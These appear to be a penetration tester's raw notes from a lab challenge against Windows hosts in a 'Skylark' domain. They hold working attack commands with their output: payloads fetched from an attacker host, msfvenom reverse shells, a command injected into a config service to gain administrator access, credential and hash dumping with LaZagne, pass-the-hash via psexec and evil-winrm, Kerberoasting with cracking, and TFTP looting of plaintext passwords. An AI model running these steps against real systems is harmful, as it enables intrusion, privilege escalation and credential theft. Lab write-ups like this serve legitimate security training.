  192.168.202.221  255.255.255.255         On-link   192.168.202.221    271
  192.168.202.255  255.255.255.255         On-link   192.168.202.221    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.202.221    271
        224.0.0.0        240.0.0.0         On-link     10.10.162.254    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.202.221    271
  255.255.255.255  255.255.255.255         On-link     10.10.162.254    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.202.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

				CREDS: 
# LaZagne: 
iwr -uri http://192.168.45.172:80/LaZagne.exe -Outfile laz.exe
.\laz.exe all
[+] 0 passwords have been found.

#Powershell password hunting:
PS C:\Users\kiosk\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\kiosk\Documents> type C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Clear-History

# CHECK Powershell FOLDER:

			FILES OF INTEREST:
PS C:\Users\kiosk\Downloads> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/15/2024   7:58 PM             34 local.txt

Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Include *.rdp -File -Recurse -ErrorAction SilentlyContinue -Force
# CHECK IF NOTHNIG 
Get-ChildItem -Path C:\ -Include *.aspx -File -Recurse -ErrorAction SilentlyContinue -Force


			REVERSE SHELL: 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.172 LPORT=2560 -f exe > rev.exe
iwr -uri http://192.168.45.172:80/rev.exe -Outfile reve.exe

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/WINDOWS-PRIV]
â””â”€$ nc -nvlp 2560
listening on [any] 2560 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.202.221] 53680
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\kiosk\Downloads>whoami
skylark\kiosk

C:\Users\kiosk\Downloads>powershell -ep pypass


			WINPEAS: 
iwr -uri http://192.168.45.172:80/winPEASx64.exe -Outfile winpea.exe
PS C:\Users\kiosk\Downloads> .\winpea.exe

    SKYLARK\Administrator
    SKYLARK\kiosk
    SKYLARK\helpdesk_setup
    SKYLARK\backup_service

          Í¹ Interesting Processes -non Microsoft-
    SkylarkStatus(412)[C:\Status\SkylarkStatus.exe] -- POwn: kiosk -- isDotNet
    Possible DLL Hijacking folder: C:\Status (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                                           
    Command Line: "C:\Status\SkylarkStatus.exe" 

          Í¹ Modifiable Services
  Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                     
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    ConsentUxUserSvc_9bd4bf: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_9bd4bf: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_9bd4bf: GenericExecute (Start/Stop)
    DevicePickerUserSvc_9bd4bf: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_9bd4bf: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_9bd4bf: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_9bd4bf: GenericExecute (Start/Stop)
    UdkUserSvc_9bd4bf: GenericExecute (Start/Stop)
    UnistoreSvc_9bd4bf: GenericExecute (Start/Stop)
    UserDataSvc_9bd4bf: GenericExecute (Start/Stop)
    WpnUserService_9bd4bf: GenericExecute (Start/Stop)

          Í¹ Autorun Applications
    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    RegPerms: kiosk [FullControl]
    Key: ctfmon.exe
    Folder: ctfmon.exe
    File: ctfmon.exe /n (Unquoted and Space detected)

    Folder: C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: kiosk [AllAccess]
    File: C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: kiosk [AllAccess]


          Í¹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )
    Users (Path: C:\Users) -- Permissions: AllAccess

          Í¹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    kiosk::SKYLARK:1122334455667788:5f5ca6fb136a094918e150c237ecc663:01010000000000008f89f9e077a7da014d236423b9d7be17000000000800300030000000000000000000000000200000d9ec1e31dec30a526a6a1a281c38ae5470d849d16844024eef10a4c5f621cdbd0a00100000000000000000000000000000000000090000000000000000000000    

          Í¹ Current TCP Listening Ports
  TCP        10.10.162.254         40000         0.0.0.0               0               Listening         6448            powershell



			PORT FORWARD: Ligolo
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

python3 -m http.server 80
iwr -uri http://192.168.45.172:80/agent.exe -Outfile agent.exe
./agent -connect 192.168.45.172:11601 -ignore-cert

session 
1
ipconfig
10.10.162.254

sudo ip route add 10.10.162.0/24 dev ligolo
start


				conf> 40000
          Í¹ Current TCP Listening Ports
  TCP        10.10.162.254         40000         0.0.0.0               0               Listening         6448            powershell

# How to check for open ports on Windows
PS C:\Users\kiosk\Downloads> netstat -aon
  TCP    10.10.162.254:40000    0.0.0.0:0              LISTENING       6448

# How to get a PID using the command prompt
PS C:\Users\kiosk\Downloads> tasklist
powershell.exe                6448 Services                   0     96,652 K


# TEST: 10.10.162.254  
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -sC -sV 10.10.162.254  
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2022-11-15T12:30:26
|_Not valid after:  2023-05-17T12:30:26
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds  Windows Server 2022 Standard 20348 microsoft-ds
10000/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-16T12:02:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2024-04-11T09:40:47
|_Not valid after:  2024-10-11T09:40:47
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h44m59s, deviation: 3h30m01s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard 20348 (Windows Server 2022 Standard 6.3)
|   Computer name: austin02
|   NetBIOS computer name: AUSTIN02\x00
|   Domain name: SKYLARK.com
|   Forest name: SKYLARK.com
|   FQDN: austin02.SKYLARK.com
|_  System time: 2024-05-16T05:02:20-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-16T12:02:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


sudo ip route add 240.0.0.1/32 dev ligolo


		# NETCAT: Launching Reverse (Backdoor) Shells
		https://www.varonis.com/blog/netcat-commands
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nv 10.10.162.254 40000
(UNKNOWN) [10.10.162.254] 40000 (?) open
conf> 
Invalid command. For list of commands, try '?'

conf> ?
=== Configuration shell ===
?/help          List commands.
q/quit  Quit.

del_config      Delete config file.
read_config     Read config file.
write_config    Write to config file.

conf> read_config
Running 'cat C:\Status\run.conf'
123


				# WRITE TO CONF 
PS C:\Users\kiosk\Downloads> cd C:\Status\                        

# You can try generating a reverse shell and execute it to escalate your privileges: 
write_config 123';c:\temp\reve.exe '123

# Copy and paste reverse shell in \temp folder via RDP or Python: 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.172 LPORT=2560 -f exe > reve.exe

conf> write_config 123';c:\temp\reve.exe '123
Writing '123';c:\temp\reve.exe '123' to config file 'C:\Status\run.conf'
Running 'echo '123';c:\temp\reve.exe '123' >> C:\Status\run.conf'
123

OR

PS C:\Users\kiosk\Downloads> iwr -uri http://192.168.45.172:80/rev.exe -Outfile revs.exe
conf> write_config 123';C:\Users\kiosk\Downloads\revs.exe '123
Writing '123';C:\Users\kiosk\Downloads\revs.exe '123' to config file 'C:\Status\run.conf'
Running 'echo '123';C:\Users\kiosk\Downloads\revs.exe '123' >> C:\Status\run.conf'
123


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 2560
listening on [any] 2560 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.202.221] 55969
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
austin02\administrator

C:\Windows\system32> powershell -ep bypass


				DUMP CREDS: 
# LaZagne: 
PS C:\Users\kiosk> cd Downloads

PS C:\Users\kiosk\Downloads> .\laz.exe all
[+] System masterkey decrypted for 076848cb-1bcc-4f8c-be64-cf970b7e0a26
[+] System masterkey decrypted for 86796108-dc37-4fae-b467-2b74befcfb8b
[+] System masterkey decrypted for 9d73957d-2d8c-45a9-a3ca-0f4f6889ada7
[+] System masterkey decrypted for eb855d01-df8b-4f3e-bc41-7976686af977
########## User: SYSTEM ##########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:70a56b66d22ac2c6c12544f0f8cb1d51:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: 04195d1c3352068a81238142ec54b80bfcbe69a2
Nthash: 92dd9eace3cf9ea33a95953aef6845ba
Login: kiosk

[+] Shahash found !!!
Shahash: 945c9f3d740a00639bbfbd6864b35f7cb135b299
Nthash: c31fae09682e09c143d4bc2e7f93826d
Login: AUSTIN02$

[+] Shahash found !!!
Shahash: b6c2ba5282b13d5849f8953cac8d18df81763665
Nthash: 17add237f30abaecc9d884f72958b928
Login: Administrator
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   5F EB 14 3D 85 76 23 EB 1C E8 E6 92 44 5F DB A4    _..=.v#.....D_..
0020   62 98 07 9F F4 67 D2 6E 33 80 E0 44 C9 48 C7 B7    b....g.n3..D.H..
0030   0C FF EE AA 97 C9 1E 50 AF 24 12 63 64 AF D1 60    .......P.$.cd..`
0040   DF 55 D0 EB 1D D9 35 49 DD B2 BE AD B2 BA C8 0E    .U....5I........
0050   E8 70 F8 F2 1D 47 C7 07 8A 14 84 E4 44 77 B9 00    .p...G......Dw..
0060   4E A5 C9 7D F1 DA 8E 06 F5 C3 FF 52 78 AB 8B A2    N..}.......Rx...
0070   75 3D 06 47 FA 69 4B 5A F5 7E CC 93 DB 90 2B 1D    u=.G.iKZ.~....+.
0080   0C B6 37 BA DE E0 35 45 BE 10 33 5D 74 52 A8 39    ..7...5E..3]tR.9
0090   79 12 73 7C A6 EE 99 30 38 3E 4C E9 E3 FF 57 A3    y.s|...08>L...W.
00A0   40 86 AB 36 0A EF BB 64 AC 57 80 EA 89 62 5B 87    @..6...d.W...b[.
00B0   11 4E C5 78 00 38 C3 94 E3 5A 80 5E E3 3F 17 38    .N.x.8...Z.^.?.8
00C0   66 21 7B 6A 53 0D C1 A9 8E AC F8 A0 98 24 71 FD    f!{jS........$q.
00D0   D2 66 41 73 24 80 A6 9E 8A 6C 01 17 6B 0F E1 F1    .fAs$....l..k...
00E0   F3 38 7B EA 4E 72 02 85 D6 80 67 98 23 9D 1D 2E    .8{.Nr....g.#...
00F0   3F EE C9 B9 51 A2 B1 A6 FA 05 68 F3 FD 6B B1 BC    ?...Q.....h..k..
0100   07 A2 72 91 14 1C 9C 15 E0 7A 15 8D E3 8F E3 88    ..r......z......
DPAPI_SYSTEM
0000   01 00 00 00 3D 9E DE CC D8 BA 6A 6A 3C A0 9D B4    ....=.....jj<...
0010   06 FD 6A 44 E8 64 1D 9D 4D 1F B2 FB 8A EC 23 58    ..jD.d..M.....#X
0020   D6 11 65 2C 97 89 06 E5 88 DD FD 1A                ..e,........
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   A0 25 64 E4 40 A7 D8 1F 1F 82 7E D4 D7 6A DF 18    .%d.@.....~..j..
0020   A2 69 0E D2 33 98 67 7B C2 04 CE 09 DD 10 15 55    .i..3.g{.......U
0030   BC 50 CB 75 B8 D8 30 71 70 D4 60 EC C3 3C 03 A2    .P.u..0qp.`..<..
0040   35 C8 E0 D4 A8 46 4A C6 58 9C CC F2 6E 31 B8 74    5....FJ.X...n1.t
0050   46 22 1E DF 8F 7C 8A 9A 49 B0 B4 76 4C 90 23 23    F"...|..I..vL.##
[+] b6c2ba5282b13d5849f8953cac8d18df81763665 ok for masterkey 88fb54a6-b091-44cf-9e70-6fa90711e888
[+] b6c2ba5282b13d5849f8953cac8d18df81763665 ok for masterkey 9f4efe80-bf82-4be4-944e-82c8ebaaa597
[+] b6c2ba5282b13d5849f8953cac8d18df81763665 ok for masterkey e6cb0461-4ee0-435a-abec-2a1685640e22
[+] b6c2ba5282b13d5849f8953cac8d18df81763665 ok for masterkey ee13580f-a31a-429c-a967-2da966b5c767

########## User: Administrator.SKYLARK ##########
------------------- Chromium edge passwords -----------------
[+] Password found !!!
URL: 
Login: 
Password: b'v10\xef\xbc\x80I\xa8\xd1\xfc\xb1J\xcd \xc1\xa9.q]\xb1\x15~\xf2\xa6\xdf\x05$\xc1\xe7\xd1\xb2'
[+] Password found !!!
URL: 
Login: 
Password: b'v10&\xea\xdab_\xbe\xbc\xd8\x8b\x9bK\x0b+\xc6\xb7FI\xef^:\x8a`\x1e\x13\x0c1\xb2\x15'
[+] 5 passwords have been found.


				MIMIKATZ: 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928 Administrator@192.168.230.221

iwr -uri http://192.168.45.175:80/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
privilege::debug


			ACCESS: SMB / WIMI - proof.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928:::
Nthash: 17add237f30abaecc9d884f72958b928
Login: Administrator

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928 Administrator@192.168.230.221


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 192.168.230.221 -u Administrator -H 17add237f30abaecc9d884f72958b928

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/15/2024   7:58 PM             34 proof.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
0eeb29879a50707e2e03855b8d6a89c2


				CRACK HASHES: 
Nthash: 92dd9eace3cf9ea33a95953aef6845ba
Login: kiosk

Nthash: c31fae09682e09c143d4bc2e7f93826d
Login: AUSTIN02$

Nthash: 17add237f30abaecc9d884f72958b928
Login: Administrator

nano kiosk.hash
nano austin.hash
nano admin.hash

Status...........: Exhausted
hashcat -m 1000 kiosk.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat -m 1000 austin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

john kiosk.hash -w=/usr/share/wordlists/rockyou.txt 
john austin.hash -w=/usr/share/wordlists/rockyou.txt 
john admin.hash -w=/usr/share/wordlists/rockyou.txt 



				ROASTING: 
C:\Windows\system32> nslookup 
DNS request timed out.
    timeout was 2 seconds.
Default Server:  UnKnown
Address:  10.10.190.250


â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ impacket-GetNPUsers -dc-ip 10.10.190.250 -outputfile hashes.asreproast -request SKYLARK.com/kiosk
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
No entries found!


â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ impacket-GetUserSPNs -request -dc-ip 10.10.190.250 SKYLARK.com/kiosk
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
ServicePrincipalName                      Name            MemberOf                                     PasswordLastSet             LastLogon                   Delegation 
----------------------------------------  --------------  -------------------------------------------  --------------------------  --------------------------  ----------
AUSTIN02/backup_service.SKYLARK.com:6000  backup_service  CN=backup_admins,CN=Users,DC=SKYLARK,DC=com  2023-01-06 10:00:42.624035  2023-01-09 12:27:12.192667             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*backup_service$SKYLARK.COM$SKYLARK.com/backup_service*$c4d900cf8963d5f46e72a64e22f9507e$f0a56aff85b7b01bcf1d2adf9e47c72bff0d6221bec9112a0004aa9700ad30054ae23110c778f9cf5a636824f14eae6244ee6382d87ac4df6e8b3e8cba8d5e860e41003901e387bf47cb7fbb2361e0c98b2987dd4a0caf20e5e9c8c3664c74cde3099b3cb777a179d37d4b983a7295a2d5714e289b968a51fa94de8ab5153b57f57637017487db7ba82ae61edcb994e378afbe839671bf42f828f6f105310c81c0cff704a95e1e2dab8ba20fdca8989403a2f5008a3b9e8305fe89da9f179708bd31ffa419bd40645060fb4960f716f952960d141280040768406e4ce9f359b8f46ef7a5ee893e2ebb2eb057a781605a1e832d595be0a0cdb9c624c56bd45b0bc736adba692d659cdbadcec88cf2d192885a1d93d3c595d608cb89f8658b784474960079c8ad1159b18a353329efc8321d719f18f0cfba7ed90195663724271f450fab382c4db56e49e6786f429852ef62109d4f4ac0b8d89c6559eb24e466d99511996ae9e5199bd2761e9e73f33351d6442cdf7dc3ce75a916e4c6174f393675dc015da47d3d895a9e9e36825e601eb7c93d60e1fd7976ee80c5a946cbe2219729970572167104641eb21e38078f2323b3af7439a3bbe5d2289ec0746228df626a34caaade2e549e2ce217cec57199e35466d576ed09f7005bf5647464fd4aa01d0f1c1770578be45f5d201ad8096c25ba261f36dbb6f7fb8a9dc291a4e6814e40d50f20b55fd9319aad55c1e313827e74b7fe1d1f996f0c158140f724367204ae19d774d59a751bc6a07230c9b3e19c6e30a1f530ff83a7834d58e3ee4904db10c87943b1473e14aea2b0333ce4187cc7e3381edb589f71d2b260cd6d027d133dac2643813bfcae338c96c3caf03c8a1f95edd9b502e9eb666aca01c3fff4727cd25e4a028e8e3c5f8ec66d2a70226c9928afd31a5a7999b662c19300981adaf2847b3eb20b819f60180b97ed3b77768297a25b1355b0121ba5d9d6b107e2cc713fe5afd37ec1dc5994e84c87eb8792e8a230c64bc4ad9b4aaa6f82cc4ce4523dd025b939dbe8fa21c21e00da9d7aa02c15f058427c3da816b0363f83189728ee8e524a63ed735cc4fe623d9ac707157f92a0529b161b97d0dd76bcaa86964f2c14861ba90ce2bdf1de9a86a47ef877a953dd919cf64270faff4b5ce86faa3517dd03048ea1a501cd2540a170a2adc4cc858447b5431e5badf766572e5a2dcdd0988eeae3ba3566c028a94847cfce98bb2cc72b3b94d1b2f456f248810520df3850c2212845fba525d58ba5347f87ce8b2768240cfe18b02ef6da99a04b1371a70b8bf7ae1819ff1073641627793cc0d7419a292ef3534f0b7a3c14ae2f0bb4581b0c80c3347155299a81bb665a6bfe8645029a74187335d01d0b6595332526b8598aeae7b90cc2f9f5d86ae3d09894

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ nano backup_service.hash
                                                                                                  
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]- DIDNT WORK 
â””â”€$ sudo hashcat -m 13100 backup_service.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]- WORKED 
â””â”€$ john backup_service.hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
It4Server        (?)     
1g 0:00:00:18 DONE (2024-05-17 03:12) 0.05324g/s 589454p/s 589454c/s 589454C/s Iwon33..Isabelle13
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


-----------------------------------------------------------------------------------------
			192.168.225.222	Challenge 3 - VM 13 OS

HTTP: 5985 47001
RPC: 135
SMB: 139 445
???: 2994

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.222

HTTP: 5985 47001
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

RPC: 135
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC

SMB: 139 445
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
|_clock-skew: -3s
| smb2-time: 
|   date: 2024-05-14T03:22:59
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26949/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14752/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59994/udp): CLEAN (Timeout)
|   Check 4 (port 42888/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

???: 2994
2994/tcp  open  veritas-vis2? syn-ack

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.222
69/udp   open|filtered tftp
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr
Running: Microsoft Windows 2008, Novell NetWare 6.X


			TFTP: 
# WORDLIST: 
https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/tftp.txt

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/222/tftptheft]
â””â”€$ tftp 192.168.225.222  

tftp> get backup.cfg

FTP credentials for umbraco web application upgrade:
ftp_jp
~be<3@6fe1Z:2e8


			#tftptheft
https://github.com/EnableSecurity/tftptheft
thief.py - downloads files based on a pattern or list of files

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/222]
â””â”€$ git clone https://github.com/EnableSecurity/tftptheft.git
                                                                                                                                                                                
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/222]
â””â”€$ cd tftptheft     
                                                                                                  
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/222/tftptheft]
â””â”€$ python2 thief.py -p69 192.168.225.222 .

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/222/tftptheft]
â””â”€$ python2 thief.py -p69 192.168.225.222 -f tftp.txt


stun_server_username= l.nguyen
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: l.nguyen@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

stun_server_username= j.jones
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: j.jones@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

stun_server_username=j.jameson
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: j.jameson@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>



			ACCESS: 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 192.168.230.222 -u Administrator -p MusingExtraCounty98 

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
paris03\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
paris03

*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/18/2024   7:51 PM             34 local.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat local.txt
0b745490fca96503b79f2d04824815f3


			CREDS: 
# LaZagne: 
iwr -uri http://192.168.45.170:5555/LaZagne.exe -Outfile laz.exe
.\laz.exe all

#Powershell password hunting:
*Evil-WinRM* PS C:\Users\Administrator\Desktop> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
Cannot find path 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt' because it does not exist.

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
RenameComputer -NewName paris03
Rename-Computer -NewName paris03
Netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Powercfg /change monitor-timeout-ac 0
Powercfg /change monitor-timeout-dc 0
Powercfg /change standby-timeout-dc 0
Powercfg /change standby-timeout-ac 0
Powercfg /change hibernate-timeout-ac 0
Powercfg /change hibernate-timeout-dc 0
clear
cd C:\TFTP_SRV\
wget http://192.168.118.9/jitsi-defaults.properties -o sip-config
wget http://192.168.118.9/Config.xml -o sip_327.cfg
Get-Service -Name TFTPD
Get-Service
Get-Service | findstr tftp
Get-Service -Name Tftpd32_svc
Get-Service | findstr tftp
Get-Service -Name Tftpd32_svc
Get-EventLog -InstanceID 7035
Get-EventLog -InstanceID 7040
exit

			NETWORK: 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.230.222
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.230.254

*Evil-WinRM* PS C:\Users\Administrator\Desktop> route print
===========================================================================
Interface List
 11...00 50 56 ab ff f8 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.230.254  192.168.230.222     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.230.0    255.255.255.0         On-link   192.168.230.222    271
  192.168.230.222  255.255.255.255         On-link   192.168.230.222    271
  192.168.230.255  255.255.255.255         On-link   192.168.230.222    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.230.222    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
